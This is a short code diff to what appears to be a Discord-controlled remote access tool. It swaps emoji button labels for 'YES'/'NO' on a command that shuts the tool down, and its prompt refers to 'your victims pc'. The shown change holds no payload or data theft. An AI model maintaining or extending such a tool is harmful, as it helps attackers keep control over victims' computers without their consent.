@@ -181,18 +181,18 @@ async def exit_command(ctx: SlashContext):
         buttons = [
                 create_button(
                     style=ButtonStyle.green,
-                    label="✔"
+                    label="YES"
                 ),
                 create_button(
                     style=ButtonStyle.red,
-                    label="❌"
+                    label="NO"
                 ),
               ]
         action_row = create_actionrow(*buttons)
         await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])
 
         res = await client.wait_for('button_click')
-        if res.component.label == "✔":
+        if res.component.label == "YES":
             await ctx.send(content="Exited the program!", hidden=True)
             os._exit(0)
         else:
